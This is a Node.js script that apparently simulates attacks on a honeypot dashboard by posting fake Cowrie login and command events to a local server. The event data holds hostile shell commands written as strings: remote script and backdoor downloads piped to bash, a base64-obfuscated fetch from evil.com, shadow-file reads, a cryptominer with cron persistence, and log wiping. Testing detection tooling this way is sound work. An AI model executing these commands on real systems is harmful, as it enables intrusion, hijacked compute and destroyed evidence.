// ── Terminal Attack Simulator ─────────────────────────────────────────────────
// Run: node scripts/attack-simulator.js
// Or:  node scripts/attack-simulator.js --ip 1.2.3.4 --country China --scenario crypto

const http = require("http");
const args = process.argv.slice(2);
const get = (flag, def) => { const i = args.indexOf(flag); return i !== -1 ? args[i+1] : def; };

const HOST    = get("--host", "127.0.0.1");
const PORT    = get("--port", "3000");
const IP      = get("--ip",   `${rnd(1,254)}.${rnd(1,254)}.${rnd(1,254)}.${rnd(1,254)}`);
const COUNTRY = get("--country", "Russia");
const SCENARIO= get("--scenario", "full"); // full | bruteforce | crypto | recon | dropper

function rnd(a, b) { return Math.floor(Math.random() * (b - a + 1)) + a; }
function sleep(ms)  { return new Promise(r => setTimeout(r, ms)); }

async function sendEvent(event) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify(event);
    const req = http.request({ host:HOST, port:PORT, path:"/api/import/cowrie", method:"POST",
      headers:{"Content-Type":"application/json","Content-Length":Buffer.byteLength(body)}
    }, res => { res.resume(); res.on("end", resolve); });
    req.on("error", reject);
    req.write(body); req.end();
  });
}

async function loginAttempt(username, password) {
  await sendEvent({ eventid:"cowrie.login.failed", src_ip:IP, country:COUNTRY, username, password,
    timestamp: new Date().toISOString() });
  console.log(`  [LOGIN FAILED]  ${username}:${password}`);
  await sleep(rnd(200, 600));
}

async function command(input, description) {
  await sendEvent({ eventid:"cowrie.command.input", src_ip:IP, country:COUNTRY, username:"root",
    input, timestamp: new Date().toISOString() });
  console.log(`  [COMMAND]  ${description || input}`);
  await sleep(rnd(400, 1000));
}

const SCENARIOS = {
  bruteforce: async () => {
    console.log("\n🔑 Running: Brute Force Attack");
    const users  = ["root","admin","ubuntu","pi","user","oracle","test","guest","nagios","deploy"];
    const passes = ["123456","password","admin","root","toor","qwerty","1234","letmein","pass","changeme"];
    for (const u of users.slice(0, 6)) {
      for (const p of passes.slice(0, 3)) await loginAttempt(u, p);
    }
  },
  recon: async () => {
    console.log("\n🔍 Running: Reconnaissance Attack");
    await loginAttempt("root", "toor");
    await command("uname -a",                          "Fingerprint OS version");
    await command("whoami; id; hostname",              "Check current user and host");
    await command("cat /etc/passwd | head -20",        "Read user account list");
    await command("cat /etc/shadow | head -5",         "Attempt to read password hashes");
    await command("ps aux | grep -v grep",             "List running processes");
    await command("netstat -an | grep LISTEN",         "Find open ports");
    await command("nmap -sV 10.0.0.0/24",             "Scan internal network");
    await command("find / -perm -4000 -type f 2>/dev/null", "Look for SUID exploits");
    await command("cat /proc/version",                 "Get kernel version");
  },
  crypto: async () => {
    console.log("\n⛏  Running: Cryptomining Attack");
    await loginAttempt("root", "123456");
    await loginAttempt("ubuntu", "ubuntu");
    await command("uname -a; whoami",                  "System fingerprint");
    await command("wget http://pool.minexmr.com/xmrig -O /tmp/kworker", "Download miner");
    await command("chmod +x /tmp/kworker",             "Make miner executable");
    await command("/tmp/kworker -o stratum+tcp://pool.minexmr.com:4444 --donate-level 1", "Start mining");
    await command("echo '@reboot /tmp/kworker' | crontab -", "Install persistence via cron");
    await command("ps aux | grep kworker",             "Verify miner is running");
  },
  dropper: async () => {
    console.log("\n💀 Running: Payload Dropper Attack");
    await loginAttempt("root", "password");
    await loginAttempt("admin", "admin123");
    await command("curl -fsSL http://185.244.31.10/install.sh | bash", "Execute remote script");
    await command("wget http://evil-update.com/bins/x86_64 -O /tmp/.update", "Download backdoor");
    await command("chmod +x /tmp/.update && /tmp/.update", "Run backdoor");
    await command("echo Y3VybCBodHRwOi8vZXZpbC5jb20vc2ggfCBiYXNo | base64 -d | bash", "Obfuscated payload");
    await command("crontab -l; (crontab -l; echo '*/5 * * * * /tmp/.update') | crontab -", "Persistent cron");
    await command("systemctl enable ssh; systemctl start cron", "Ensure services running");
    await command("history -c; unset HISTFILE; rm -rf /var/log/auth.log", "Cover tracks");
  },
  full: async () => {
    console.log("\n🎯 Running: Full Multi-Stage Attack");
    await SCENARIOS.bruteforce();
    await sleep(1000);
    await SCENARIOS.recon();
    await sleep(1000);
    await SCENARIOS.dropper();
    await sleep(1000);
    await SCENARIOS.crypto();
  }
};

(async () => {
  console.log(`\n╔══════════════════════════════════════════╗`);
  console.log(`║   HoneyTrace AI — Attack Simulator       ║`);
  console.log(`╚══════════════════════════════════════════╝`);
  console.log(`\nTarget:   http://${HOST}:${PORT}`);
  console.log(`Attacker: ${IP} (${COUNTRY})`);
  console.log(`Scenario: ${SCENARIO}\n`);

  const fn = SCENARIOS[SCENARIO] || SCENARIOS.full;
  try {
    await fn();
    console.log(`\n✅ Attack simulation complete!`);
    console.log(`   Open http://${HOST}:${PORT} and click "Refresh" to see the results.\n`);
    console.log(`   Or run other scenarios:`);
    console.log(`   node scripts/attack-simulator.js --scenario bruteforce --country China --ip 121.18.238.12`);
    console.log(`   node scripts/attack-simulator.js --scenario crypto --country Netherlands`);
    console.log(`   node scripts/attack-simulator.js --scenario recon --country Germany\n`);
  } catch (e) {
    console.error(`\n❌ Error: ${e.message}`);
    console.error(`   Make sure the server is running: node server.js\n`);
  }
})();
